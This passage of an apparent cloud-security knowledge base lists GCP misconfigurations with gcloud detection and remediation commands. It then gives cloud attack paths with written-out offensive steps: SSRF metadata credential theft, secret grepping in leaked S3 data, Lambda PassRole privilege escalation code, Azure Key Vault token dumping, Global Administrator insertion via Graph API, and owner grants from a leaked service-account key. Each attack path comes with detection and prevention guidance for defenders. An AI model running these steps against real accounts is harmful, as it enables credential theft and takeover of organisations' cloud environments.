    remediation: 'Delete user-managed keys and use alternatives:\n  gcloud iam service-accounts keys delete <key-id> --iam-account=<sa-email>\nPrefer these alternatives to exported keys:\n  1. Workload Identity Federation for external workloads (AWS, Azure, GitHub Actions)\n  2. Attached service accounts for GCE/GKE workloads\n  3. Impersonation for user-driven workflows:\n     gcloud auth application-default login --impersonate-service-account <sa-email>\nIf keys are required, rotate regularly:\n  gcloud iam service-accounts keys create key.json --iam-account=<sa-email>',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 1.4'
  },
  {
    id: 'GCP-006',
    service: 'IAM',
    misconfiguration: 'Domain-wide delegation enabled on service account',
    risk: 'Critical',
    impact: 'Service accounts with domain-wide delegation can impersonate any user in the Google Workspace domain. A compromised service account with this privilege can access email, documents, calendars, and administration of all users in the organization.',
    detection: 'gcloud iam service-accounts list --format="json" | jq \'.[] | select(.oauth2ClientId != null) | {email, oauth2ClientId}\'\nCheck the Google Workspace admin console for domain-wide delegation grants:\n  Admin Console > Security > API Controls > Domain-wide delegation',
    remediation: 'Remove domain-wide delegation unless absolutely required:\n  1. In Google Workspace Admin Console, remove the delegation grant for the service account client ID.\n  2. If delegation is required, restrict it to minimum OAuth scopes:\n     Only grant the specific scopes needed (e.g., https://www.googleapis.com/auth/gmail.readonly) not broad scopes.\n  3. Audit delegated access regularly.\n  4. Apply conditional access policies on the service account.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 1.6'
  },
  {
    id: 'GCP-007',
    service: 'Compute Engine',
    misconfiguration: 'Instance using default service account with full API access',
    risk: 'High',
    impact: 'The default Compute Engine service account (<project-number>-compute@developer.gserviceaccount.com) with the "Allow full access to all Cloud APIs" scope grants the instance broad permissions. If the instance is compromised, the attacker has wide-ranging access to project resources.',
    detection: 'gcloud compute instances list --format="table(name,serviceAccounts[0].email,serviceAccounts[0].scopes[0])" | grep "compute@developer.gserviceaccount.com"',
    remediation: 'Create a dedicated service account with minimal permissions:\n  1. Create service account:\n     gcloud iam service-accounts create <sa-name> --display-name="<description>"\n  2. Grant specific roles:\n     gcloud projects add-iam-policy-binding <project> --member=serviceAccount:<sa>@<project>.iam.gserviceaccount.com --role=roles/storage.objectViewer\n  3. Update the instance to use the new service account:\n     gcloud compute instances set-service-account <instance> --zone=<zone> --service-account=<sa>@<project>.iam.gserviceaccount.com --scopes=cloud-platform\nConsole: Compute Engine > VM > Edit > Service account > Select custom SA.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 4.1'
  },
  {
    id: 'GCP-008',
    service: 'Compute Engine',
    misconfiguration: 'Serial port access enabled on instances',
    risk: 'Medium',
    impact: 'Serial port access provides interactive console access to instances, bypassing SSH authentication. If an attacker gains access to the GCP console or API, they can use serial port access to interact with the instance OS without needing SSH keys.',
    detection: 'gcloud compute instances describe <instance> --zone=<zone> --format="value(metadata.items[key=serial-port-enable].value)"\nFor project-wide:\n  gcloud compute project-info describe --format="value(commonInstanceMetadata.items[key=serial-port-enable].value)"',
    remediation: 'Disable serial port access at the project level:\n  gcloud compute project-info add-metadata --metadata serial-port-enable=false\nFor individual instances:\n  gcloud compute instances add-metadata <instance> --zone=<zone> --metadata serial-port-enable=false\nEnforce via organization policy:\n  gcloud resource-manager org-policies enable-enforce compute.disableSerialPortAccess --organization=<org-id>\nConsole: Compute Engine > VM > Edit > Metadata > serial-port-enable: false.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 4.5'
  },
  {
    id: 'GCP-009',
    service: 'Compute Engine',
    misconfiguration: 'OS Login not enabled for SSH key management',
    risk: 'Medium',
    impact: 'Without OS Login, SSH keys are managed via instance or project metadata. This makes centralized key management, access revocation, and audit logging difficult. Former employees and compromised keys may retain access because metadata keys are not tied to IAM.',
    detection: 'gcloud compute project-info describe --format="value(commonInstanceMetadata.items[key=enable-oslogin].value)"\nShould return "TRUE". Check individual instances:\n  gcloud compute instances describe <instance> --zone=<zone> --format="value(metadata.items[key=enable-oslogin].value)"',
    remediation: 'Enable OS Login at the project level:\n  gcloud compute project-info add-metadata --metadata enable-oslogin=TRUE\nGrant OS Login roles to users:\n  gcloud projects add-iam-policy-binding <project> --member=user:<email> --role=roles/compute.osLogin\nFor admin access (sudo):\n  gcloud projects add-iam-policy-binding <project> --member=user:<email> --role=roles/compute.osAdminLogin\nEnforce via organization policy:\n  gcloud resource-manager org-policies enable-enforce compute.requireOsLogin --organization=<org-id>\nConsole: Compute Engine > Metadata > Add item: enable-oslogin = TRUE.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 4.4'
  },
  {
    id: 'GCP-010',
    service: 'Compute Engine',
    misconfiguration: 'Public IP address assigned to VM instances',
    risk: 'Medium',
    impact: 'Instances with public IPs are directly reachable from the internet. Any exposed services (SSH, web servers, databases) face continuous scanning and attack attempts. The attack surface is significantly larger than instances accessible only via private networking.',
    detection: 'gcloud compute instances list --format="table(name,zone,networkInterfaces[0].accessConfigs[0].natIP)" | grep -v "None"',
    remediation: 'Remove external IPs and use Cloud NAT for outbound access:\n  gcloud compute instances delete-access-config <instance> --zone=<zone> --access-config-name "External NAT"\nSet up Cloud NAT for outbound connectivity:\n  gcloud compute routers create <router> --region=<region> --network=<vpc>\n  gcloud compute routers nats create <nat-name> --router=<router> --region=<region> --nat-all-subnet-ip-ranges --auto-allocate-nat-external-ips\nUse IAP tunneling for SSH instead of public IPs:\n  gcloud compute ssh <instance> --zone=<zone> --tunnel-through-iap\nConsole: Compute Engine > VM > Edit > Network interfaces > External IP: None.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 4.9'
  },
  {
    id: 'GCP-011',
    service: 'GKE',
    misconfiguration: 'Legacy ABAC authorization enabled on GKE cluster',
    risk: 'High',
    impact: 'Legacy Attribute-Based Access Control (ABAC) is less granular and harder to manage than RBAC. ABAC policies can inadvertently grant broad permissions. Any pod in the cluster can access the Kubernetes API with the permissions of its service account, making privilege escalation easier.',
    detection: 'gcloud container clusters describe <cluster> --zone=<zone> --format="value(legacyAbac.enabled)"',
    remediation: 'Disable legacy ABAC (requires RBAC to be configured first):\n  gcloud container clusters update <cluster> --zone=<zone> --no-enable-legacy-authorization\nEnsure RBAC policies are in place before disabling ABAC.\nConsole: GKE > Cluster > Security > Legacy authorization: Disabled.',
    compliance: 'CIS Google Kubernetes Engine Benchmark v1.4.0 - 5.8.3'
  },
  {
    id: 'GCP-012',
    service: 'GKE',
    misconfiguration: 'No network policy enforcement in GKE cluster',
    risk: 'High',
    impact: 'Without network policies, all pods can communicate with all other pods in the cluster without restriction. A compromised pod can freely communicate with any service, database, or API within the cluster, enabling lateral movement and data exfiltration.',
    detection: 'gcloud container clusters describe <cluster> --zone=<zone> --format="value(networkPolicy.enabled)"\ngcloud container clusters describe <cluster> --zone=<zone> --format="value(addonsConfig.networkPolicyConfig.disabled)"',
    remediation: 'Enable network policy enforcement:\n  gcloud container clusters update <cluster> --zone=<zone> --update-addons=NetworkPolicy=ENABLED\n  gcloud container clusters update <cluster> --zone=<zone> --enable-network-policy\nThen create Kubernetes NetworkPolicy resources to restrict pod communication:\n  kubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-ingress\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\nEOF\nConsole: GKE > Cluster > Networking > Network policy: Enabled.',
    compliance: 'CIS Google Kubernetes Engine Benchmark v1.4.0 - 5.6.2'
  },
  {
    id: 'GCP-013',
    service: 'GKE',
    misconfiguration: 'Kubernetes Dashboard exposed without authentication',
    risk: 'Critical',
    impact: 'The Kubernetes Dashboard provides a web UI with full cluster management capabilities. If exposed without proper authentication, anyone who can reach the dashboard can view secrets, deploy workloads, access pods, and effectively control the entire cluster.',
    detection: 'gcloud container clusters describe <cluster> --zone=<zone> --format="value(addonsConfig.kubernetesDashboard.disabled)"\nCheck if the dashboard service is exposed externally:\n  kubectl get svc -n kubernetes-dashboard',
    remediation: 'Disable the Kubernetes Dashboard addon:\n  gcloud container clusters update <cluster> --zone=<zone> --update-addons=KubernetesDashboard=DISABLED\nIf the dashboard is needed, ensure it is only accessible via kubectl proxy and requires authentication:\n  kubectl proxy\n  Access via http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/\nNever expose the dashboard via LoadBalancer or NodePort services.\nConsole: GKE > Cluster > Add-ons > Kubernetes Dashboard: Disabled.',
    compliance: 'CIS Google Kubernetes Engine Benchmark v1.4.0 - 5.8.1'
  },
  {
    id: 'GCP-014',
    service: 'GKE',
    misconfiguration: 'Workload Identity not enabled on GKE cluster',
    risk: 'High',
    impact: 'Without Workload Identity, GKE pods use the node service account to access Google Cloud APIs. All pods on a node share the same permissions, violating least privilege. A compromised pod gets the full permissions of the node-level service account.',
    detection: 'gcloud container clusters describe <cluster> --zone=<zone> --format="value(workloadIdentityConfig.workloadPool)"',
    remediation: 'Enable Workload Identity on the cluster:\n  gcloud container clusters update <cluster> --zone=<zone> --workload-pool=<project-id>.svc.id.goog\nEnable on node pool:\n  gcloud container node-pools update <pool> --cluster=<cluster> --zone=<zone> --workload-metadata=GKE_METADATA\nConfigure Kubernetes service account to GCP service account mapping:\n  gcloud iam service-accounts add-iam-policy-binding <gcp-sa>@<project>.iam.gserviceaccount.com --role=roles/iam.workloadIdentityUser --member="serviceAccount:<project>.svc.id.goog[<namespace>/<k8s-sa>]"\n  kubectl annotate serviceaccount <k8s-sa> --namespace <namespace> iam.gke.io/gcp-service-account=<gcp-sa>@<project>.iam.gserviceaccount.com',
    compliance: 'CIS Google Kubernetes Engine Benchmark v1.4.0 - 5.2.2'
  },
  {
    id: 'GCP-015',
    service: 'Cloud SQL',
    misconfiguration: 'Cloud SQL instance has public IP and allows connections from 0.0.0.0/0',
    risk: 'Critical',
    impact: 'A Cloud SQL instance with a public IP and an authorized network of 0.0.0.0/0 is accessible from any IP on the internet. Database brute force attacks, SQL injection exploitation, and unauthorized data access become possible from any location.',
    detection: 'gcloud sql instances list --format="table(name,settings.ipConfiguration.ipv4Enabled,settings.ipConfiguration.authorizedNetworks[].value)"\nLook for ipv4Enabled=True and any authorizedNetwork with value 0.0.0.0/0.',
    remediation: 'Remove the 0.0.0.0/0 authorized network:\n  gcloud sql instances patch <instance> --authorized-networks=""\nDisable public IP and use private IP only:\n  gcloud sql instances patch <instance> --no-assign-ip --network=<vpc-name>\nIf public IP is required, restrict to specific IPs:\n  gcloud sql instances patch <instance> --authorized-networks=<office-ip>/32\nUse Cloud SQL Auth Proxy for secure connections:\n  cloud_sql_proxy -instances=<project>:<region>:<instance>=tcp:5432\nConsole: Cloud SQL > Instance > Connections > Networking > Remove 0.0.0.0/0.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 6.2'
  },
  {
    id: 'GCP-016',
    service: 'Cloud SQL',
    misconfiguration: 'SSL not enforced on Cloud SQL connections',
    risk: 'High',
    impact: 'Without SSL enforcement, database connections transmit data in plaintext including queries, results, and authentication credentials. Man-in-the-middle attacks can intercept or modify database traffic.',
    detection: 'gcloud sql instances describe <instance> --format="value(settings.ipConfiguration.requireSsl)"',
    remediation: 'Enforce SSL on all connections:\n  gcloud sql instances patch <instance> --require-ssl\nCreate client certificates for application authentication:\n  gcloud sql ssl client-certs create <cert-name> client-key.pem --instance=<instance>\n  gcloud sql ssl client-certs describe <cert-name> --instance=<instance> --format="value(cert)" > client-cert.pem\n  gcloud sql instances describe <instance> --format="value(serverCaCertificate.cert)" > server-ca.pem\nConsole: Cloud SQL > Instance > Connections > SSL mode: Required.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 6.4'
  },
  {
    id: 'GCP-017',
    service: 'Cloud SQL',
    misconfiguration: 'Automated backups not enabled for Cloud SQL',
    risk: 'Medium',
    impact: 'Without automated backups, database recovery after accidental deletion, corruption, or ransomware is impossible. Point-in-time recovery is unavailable. Disaster recovery plans cannot be fulfilled.',
    detection: 'gcloud sql instances describe <instance> --format="value(settings.backupConfiguration.enabled,settings.backupConfiguration.pointInTimeRecoveryEnabled)"',
    remediation: 'Enable automated backups with point-in-time recovery:\n  gcloud sql instances patch <instance> --backup-start-time=03:00 --enable-bin-log\nFor PostgreSQL, enable point-in-time recovery:\n  gcloud sql instances patch <instance> --enable-point-in-time-recovery\nSet backup retention:\n  gcloud sql instances patch <instance> --retained-backups-count=30\nConsole: Cloud SQL > Instance > Backups > Edit > Automate backups: Enabled.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 6.7'
  },
  {
    id: 'GCP-018',
    service: 'Logging',
    misconfiguration: 'Audit logs not configured for all services or not exported',
    risk: 'High',
    impact: 'Without comprehensive audit logging, API calls, resource changes, and data access events go unrecorded. Security incidents cannot be investigated. Admin Activity logs are enabled by default but Data Access logs are not. Logs not exported to long-term storage may be lost after the default 30-day retention.',
    detection: 'gcloud projects get-iam-policy <project> --format=json | jq ".auditConfigs"\ngcloud logging sinks list --format="table(name,destination,filter)"',
    remediation: 'Enable Data Access audit logs for all services:\n  gcloud projects set-iam-policy <project> <policy-file.json>\n  Include in the policy file: "auditConfigs": [{"service": "allServices", "auditLogConfigs": [{"logType": "ADMIN_READ"}, {"logType": "DATA_READ"}, {"logType": "DATA_WRITE"}]}]\nExport logs to Cloud Storage or BigQuery for long-term retention:\n  gcloud logging sinks create audit-export storage.googleapis.com/<bucket> --log-filter="logName:activity OR logName:data_access"\nConsole: IAM & Admin > Audit Logs > Enable for all services.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 2.1'
  }
];

const CLOUD_ATTACK_PATHS = [
  {
    id: 'ATK-001',
    name: 'SSRF to Cloud Metadata Service Credential Theft',
    cloud: 'aws',
    description: 'Exploiting a Server-Side Request Forgery vulnerability in a web application to reach the EC2 instance metadata service and steal IAM role credentials. This is the most well-known cloud-specific attack vector and was central to the 2019 Capital One breach.',
    steps: [
      '1. Attacker identifies an SSRF vulnerability in a web application (e.g., URL parameter used for server-side HTTP requests, image proxy, webhook URL)',
      '2. Attacker sends a crafted request to http://169.254.169.254/latest/meta-data/ to confirm metadata service access',
      '3. Attacker enumerates the IAM role: http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      '4. Attacker retrieves temporary credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> which returns AccessKeyId, SecretAccessKey, and SessionToken',
      '5. Attacker configures AWS CLI with the stolen credentials on their own machine',
      '6. Attacker enumerates permissions using the stolen role: aws sts get-caller-identity, then attempts various API calls',
      '7. Attacker accesses S3 buckets, DynamoDB tables, or other resources the role permits',
      '8. Attacker may establish persistence by creating new IAM users or access keys if the role allows'
    ],
    impact: 'Full IAM role credential theft enabling access to all AWS resources the role permits. Depending on the role permissions, this can include reading S3 data, querying databases, invoking Lambda functions, or even full account compromise through IAM privilege escalation.',
    detection: 'Enable GuardDuty finding type UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS which detects when instance role credentials are used from outside AWS. Monitor CloudTrail for API calls made with instance role credentials from external IP addresses. Set up VPC Flow Logs to detect connections to 169.254.169.254 from application processes that should not access metadata.',
    prevention: 'Require IMDSv2 on all instances (--http-tokens required) which uses a session token that cannot be retrieved via simple GET requests. Implement a web application firewall (WAF) to block SSRF attempts. Validate and sanitize all URL inputs server-side. Apply least-privilege IAM policies to instance roles. Use VPC endpoints instead of internet access for AWS service calls.'
  },
  {
    id: 'ATK-002',
    name: 'Public S3 Bucket to Source Code to Hardcoded Secrets to RCE',
    cloud: 'aws',
    description: 'Chaining a misconfigured S3 bucket containing source code or configuration files to discover hardcoded credentials, then using those credentials to access additional services and ultimately achieve remote code execution.',
    steps: [
      '1. Attacker enumerates S3 buckets using company name patterns: aws s3 ls s3://<company>-dev, s3://<company>-staging, s3://<company>-backups',
      '2. Attacker finds a publicly readable bucket containing application source code, deployment scripts, or .env files',
      '3. Attacker downloads the contents: aws s3 sync s3://<bucket> ./loot/ --no-sign-request',
      '4. Attacker greps through downloaded files for credentials: grep -rn "password\\|secret\\|api_key\\|access_key" ./loot/',
      '5. Attacker discovers hardcoded database credentials, API keys, or AWS access keys in source files or configuration',
      '6. Using discovered database credentials, attacker connects to an RDS instance (if publicly accessible) or other data stores',
      '7. Using discovered AWS access keys, attacker accesses additional services and enumerates further',
      '8. If SSH keys or deployment credentials are found, attacker gains direct shell access to production servers'
    ],
    impact: 'Complete compromise starting from a single public S3 bucket. Source code exposure reveals application logic, vulnerabilities, and hardcoded credentials. Chained credential discovery can lead to database access, further AWS resource access, and remote code execution on production infrastructure.',
    detection: 'Use AWS Config rule s3-bucket-public-read-prohibited to detect public buckets. Enable S3 server access logging to track anonymous downloads. Use AWS Macie to scan S3 buckets for sensitive data including credentials. Monitor CloudTrail for s3:GetObject calls from anonymous or unknown principals. Use git-secrets or truffleHog to scan repositories for hardcoded credentials.',
    prevention: 'Enable S3 Block Public Access at the account level. Never store secrets in source code; use AWS Secrets Manager or Parameter Store. Implement pre-commit hooks to detect secrets before they reach repositories. Enable S3 Object Lock on critical buckets. Scan all S3 buckets regularly with Macie for sensitive data exposure.'
  },
  {
    id: 'ATK-003',
    name: 'IAM Privilege Escalation via PassRole and Lambda',
    cloud: 'aws',
    description: 'Exploiting the iam:PassRole permission combined with lambda:CreateFunction and lambda:InvokeFunction to escalate privileges by creating a Lambda function that runs with a higher-privileged role.',
    steps: [
      '1. Attacker obtains AWS credentials for a user/role with iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions',
      '2. Attacker identifies a higher-privileged role (e.g., one with AdministratorAccess) that has a trust policy allowing Lambda to assume it',
      '3. Attacker writes a malicious Lambda function that performs privileged actions:\n   import boto3\n   def handler(event, context):\n       client = boto3.client("iam")\n       client.attach_user_policy(UserName="attacker-user", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")\n       return "escalated"',
      '4. Attacker creates the Lambda function with the privileged role:\n   aws lambda create-function --function-name escalate --runtime python3.9 --role arn:aws:iam::<account>:role/<privileged-role> --handler lambda_function.handler --zip-file fileb://escalate.zip',
      '5. Attacker invokes the function: aws lambda invoke --function-name escalate output.json',
      '6. The Lambda function executes with the permissions of the privileged role, attaching AdministratorAccess to the attacker-controlled user',
      '7. Attacker now has full administrator access to the AWS account'
    ],
    impact: 'Complete privilege escalation from a limited IAM principal to full administrator access. The attacker can then access all data, modify all resources, create backdoor accounts, and maintain persistent access to the environment.',
    detection: 'Monitor CloudTrail for lambda:CreateFunction events, especially those using iam:PassRole with high-privilege roles. Alert on iam:AttachUserPolicy or iam:AttachRolePolicy events, particularly those attaching AdministratorAccess. Use IAM Access Analyzer to detect roles that can be assumed by Lambda. Monitor for unusual Lambda function creation patterns.',
    prevention: 'Restrict iam:PassRole to specific role ARNs using resource conditions. Never grant iam:PassRole with Resource: "*". Implement SCP policies at the organization level to deny privilege escalation actions. Use IAM permissions boundaries to cap the maximum permissions any role can have. Regularly audit IAM policies for dangerous permission combinations using tools like PMapper or Cloudsplaining.'
  },
  {
    id: 'ATK-004',
    name: 'Cross-Account Role Assumption via Confused Deputy',
    cloud: 'aws',
    description: 'Exploiting misconfigured cross-account IAM role trust policies that lack ExternalId conditions to assume roles in victim accounts. This is the classic "confused deputy" problem where a trusted third-party service can be tricked into acting on behalf of an attacker.',
    steps: [
      '1. Attacker identifies a target organization that uses a third-party SaaS service with cross-account IAM role access',
      '2. Attacker signs up for the same SaaS service and creates their own account',
      '3. Attacker notes the SaaS provider AWS account ID from their own configuration (this is public or easily discoverable)',
      '4. If the victim role trust policy allows the SaaS account without ExternalId conditions, any customer of the SaaS can assume it',
      '5. Attacker instructs the SaaS service to assume the victim role ARN (if they can guess or enumerate it)',
      '6. The SaaS service, confused into acting for the attacker, assumes the victim role and performs actions',
      '7. Alternatively, attacker may directly attempt: aws sts assume-role --role-arn arn:aws:iam::<victim-account>:role/<role-name> from an account in the trusted principal list'
    ],
    impact: 'Unauthorized access to the victim AWS account with the permissions of the cross-account role. This can include reading sensitive data, modifying resources, or further escalating privileges within the victim account.',
    detection: 'Monitor CloudTrail for sts:AssumeRole events from unexpected external accounts. Alert on cross-account role assumptions that do not include ExternalId. Use AWS Config rules to detect roles with trust policies that allow external accounts without ExternalId conditions. Enable GuardDuty for anomalous cross-account activity.',
    prevention: 'Always require ExternalId in cross-account role trust policies. Use unique, random ExternalId values for each trust relationship. Restrict trust policies to specific IAM principals (roles/users) rather than entire accounts. Regularly audit cross-account roles and their trust policies. Use AWS Organizations SCPs to restrict which external accounts can assume roles.'
  },
  {
    id: 'ATK-005',
    name: 'Container Escape to Node to Cloud Credentials',
    cloud: 'aws',
    description: 'Escaping from a compromised container in EKS to the underlying node, then accessing the node instance role credentials via the metadata service to pivot into the broader AWS environment.',
    steps: [
      '1. Attacker compromises a containerized application (e.g., via web vulnerability, supply chain attack, or vulnerable dependency)',
      '2. Attacker checks for privileged mode or dangerous capabilities: cat /proc/1/status | grep Cap, mount | grep cgroup',
      '3. If the container is privileged or has CAP_SYS_ADMIN, attacker escapes to the host using known techniques (cgroup escape, mount namespace abuse)',
      '4. On the host node, attacker accesses the instance metadata service: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      '5. Attacker retrieves the EKS node IAM role credentials, which typically have permissions to ECR, CloudWatch, EKS, and possibly S3',
      '6. Attacker uses node credentials to pull container images from ECR, which may contain additional secrets',
      '7. Attacker accesses the Kubernetes API using the node credentials or mounted service account tokens found at /var/run/secrets/kubernetes.io/serviceaccount/token',
      '8. Attacker enumerates other pods, secrets, and config maps within the cluster: kubectl get secrets --all-namespaces'
    ],
    impact: 'Full node compromise provides access to all containers on the node, Kubernetes secrets, and the node IAM role. From there, the attacker can access AWS resources, move laterally within the cluster, and potentially compromise the entire EKS environment and associated AWS account.',
    detection: 'Monitor for unusual process execution on EKS nodes (Falco, Sysdig). Alert on metadata service access from container processes. Enable GuardDuty EKS protection for Kubernetes audit log analysis. Monitor for privilege escalation attempts within containers. Use Runtime threat detection for container escape indicators.',
    prevention: 'Never run containers in privileged mode. Drop all capabilities and add only those required. Enable Pod Security Standards (restricted) in namespaces. Use Workload Identity / IRSA to provide pods with specific IAM roles instead of relying on node roles. Enforce IMDSv2 on EKS nodes with hop limit of 1 (blocks container metadata access). Use Bottlerocket or read-only node OS images. Implement network policies to restrict pod-to-pod and pod-to-metadata communication.'
  },
  {
    id: 'ATK-006',
    name: 'Lambda Function Enumeration and Data Exfiltration',
    cloud: 'aws',
    description: 'Using compromised Lambda function credentials or overprivileged execution roles to enumerate the AWS environment and exfiltrate data through Lambda invocations.',
    steps: [
      '1. Attacker identifies a Lambda function with an overprivileged execution role (common in development/staging environments)',
      '2. Attacker exploits a code injection vulnerability in the function (e.g., via event data that is evaluated or passed to shell commands)',
      '3. From within the Lambda execution environment, attacker accesses the role credentials via environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN',
      '4. Attacker enumerates AWS resources: list S3 buckets, describe RDS instances, list DynamoDB tables, list Secrets Manager secrets',
      '5. Attacker reads sensitive data from discovered resources: S3 objects, DynamoDB items, Secrets Manager values, Parameter Store secure strings',
      '6. Attacker exfiltrates data through the Lambda function return value, writes to an attacker-controlled S3 bucket, or sends via HTTPS to an external endpoint',
      '7. Attacker may modify Lambda environment variables or create new functions for persistent access'
    ],
    impact: 'Data exfiltration from all AWS resources accessible to the Lambda execution role. If the role has broad permissions, this can include databases, object storage, secrets, and configuration data across the account.',
    detection: 'Monitor CloudTrail for unusual API calls made by Lambda execution roles (list/describe/get operations on resources not normally accessed). Alert on Lambda functions making calls to unfamiliar services. Monitor for high-volume S3 GetObject or DynamoDB Scan operations from Lambda. Enable GuardDuty for credential exfiltration detection. Track Lambda invocation patterns and alert on anomalies.',
    prevention: 'Apply least-privilege execution roles to all Lambda functions. Sanitize all event input data before processing. Use Lambda resource policies to restrict invocation sources. Enable AWS Lambda Insights for function monitoring. Implement VPC endpoints to prevent Lambda functions from accessing the internet. Use Lambda layers for dependency management to reduce supply chain risk.'
  },
  {
    id: 'ATK-007',
    name: 'Azure Managed Identity to Key Vault Secrets Exfiltration',
    cloud: 'azure',
    description: 'Exploiting a compromised Azure virtual machine or App Service with a managed identity that has access to Key Vault to exfiltrate secrets, certificates, and encryption keys.',
    steps: [
      '1. Attacker compromises a web application running on an Azure VM or App Service (e.g., via web shell, RCE vulnerability)',
      '2. Attacker checks for managed identity by querying the Azure Instance Metadata Service (IMDS): curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"',
      '3. Attacker receives an OAuth2 access token for the managed identity scoped to Azure Key Vault',
      '4. Attacker enumerates Key Vaults accessible to the identity: curl -H "Authorization: Bearer <token>" "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.KeyVault/vaults?api-version=2021-06-01-preview"',
      '5. Attacker lists all secrets in each vault: curl -H "Authorization: Bearer <token>" "https://<vault>.vault.azure.net/secrets?api-version=7.3"',
      '6. Attacker retrieves each secret value: curl -H "Authorization: Bearer <token>" "https://<vault>.vault.azure.net/secrets/<name>?api-version=7.3"',
      '7. Attacker exfiltrates database connection strings, API keys, certificates, and encryption keys stored in Key Vault',
      '8. Using exfiltrated credentials, attacker accesses additional resources (databases, APIs, partner services)'
    ],
    impact: 'Complete exfiltration of Key Vault secrets including database credentials, API keys, TLS certificates with private keys, and encryption keys. This typically leads to cascading compromise of databases, applications, and partner integrations that rely on Key Vault-stored credentials.',
    detection: 'Monitor Key Vault diagnostic logs for unusual Secret Get operations, especially high-volume retrieval. Alert on Key Vault access from unexpected managed identities. Enable Microsoft Defender for Key Vault for threat detection. Monitor for token requests to the IMDS endpoint from unusual processes. Set up alerts on Key Vault audit logs for bulk secret access.',
    prevention: 'Apply least-privilege Key Vault access policies granting only the specific secrets each identity needs. Use RBAC-based Key Vault access control instead of access policies. Enable Key Vault firewall to restrict network access. Enable purge protection and soft-delete. Implement private endpoints for Key Vault access. Rotate secrets regularly using Key Vault automatic rotation.'
  },
  {
    id: 'ATK-008',
    name: 'Azure AD Application Registration to Tenant Compromise',
    cloud: 'azure',
    description: 'Abusing Azure AD application registrations with excessive Microsoft Graph API permissions to escalate from an application context to full tenant administration.',
    steps: [
      '1. Attacker compromises credentials for an Azure AD application/service principal (via exposed client secret, certificate, or federated credential)',
      '2. Attacker authenticates as the application: curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" -d "client_id=<app-id>&scope=https://graph.microsoft.com/.default&client_secret=<secret>&grant_type=client_credentials"',
      '3. Attacker checks the application permissions: curl -H "Authorization: Bearer <token>" "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-id>/appRoleAssignments"',
      '4. If the app has Directory.ReadWrite.All or RoleManagement.ReadWrite.Directory, attacker can modify directory objects',
      '5. Attacker adds themselves as a Global Administrator: curl -X POST "https://graph.microsoft.com/v1.0/directoryRoles/<global-admin-role-id>/members/$ref" -d \'{"@odata.id":"https://graph.microsoft.com/v1.0/users/<attacker-user-id>"}\'',
      '6. As Global Administrator, attacker has full control over the Azure AD tenant',
      '7. Attacker creates backdoor admin accounts, adds credentials to other applications, and modifies conditional access policies',
      '8. Attacker accesses all Azure subscriptions, Microsoft 365 data, and connected SaaS applications'
    ],
    impact: 'Full Azure AD tenant compromise enabling control over all identities, applications, and connected Microsoft services. The attacker can access all user mailboxes, SharePoint sites, Teams conversations, and Azure subscriptions linked to the tenant.',
    detection: 'Monitor Azure AD sign-in logs for application authentications from unusual IPs. Alert on directory role membership changes, especially Global Administrator additions. Enable Microsoft Defender for Identity for anomalous application behavior. Monitor Microsoft Graph API audit logs for privileged operations. Alert on new credentials added to existing application registrations.',
    prevention: 'Regularly audit application permissions and remove unnecessary Graph API permissions. Require admin consent for high-privilege application permissions. Rotate application secrets and certificates on a regular schedule. Implement certificate-based authentication instead of client secrets. Monitor and alert on application registration changes. Use Conditional Access policies for service principal sign-ins (preview).'
  },
  {
    id: 'ATK-009',
    name: 'GCP Service Account Key to Project Takeover',
    cloud: 'gcp',
    description: 'Using a leaked GCP service account key to escalate privileges and gain full control over a GCP project through IAM policy manipulation.',
    steps: [
      '1. Attacker discovers a GCP service account key JSON file (in source code, CI/CD logs, developer laptop, public repository)',
      '2. Attacker authenticates using the key: gcloud auth activate-service-account --key-file=key.json',
      '3. Attacker identifies the project and checks current permissions: gcloud projects get-iam-policy <project-id>',
      '4. If the service account has resourcemanager.projects.setIamPolicy permission (via Owner, Editor, or custom role), attacker can modify project IAM',
      '5. Attacker grants themselves Owner role on the project: gcloud projects add-iam-policy-binding <project-id> --member=user:<attacker@gmail.com> --role=roles/owner',
      '6. Attacker creates additional service accounts with keys for persistence: gcloud iam service-accounts create backdoor --project=<project-id>',
      '7. Attacker accesses all project resources: Compute instances, Cloud Storage, Cloud SQL, BigQuery, Pub/Sub',
      '8. Attacker may pivot to other projects if the service account has organization-level roles'
    ],
    impact: 'Full GCP project compromise including all compute resources, storage, databases, and network infrastructure. If the service account has organization-level permissions, multiple projects can be compromised. Data exfiltration, resource destruction, and cryptomining are common post-compromise activities.',
    detection: 'Monitor Cloud Audit Logs for service account key usage, especially from external IP addresses. Alert on IAM policy changes, particularly owner role grants. Enable Security Command Center for anomalous service account behavior. Monitor for service account key creation events. Use VPC Service Controls to detect data exfiltration attempts.',
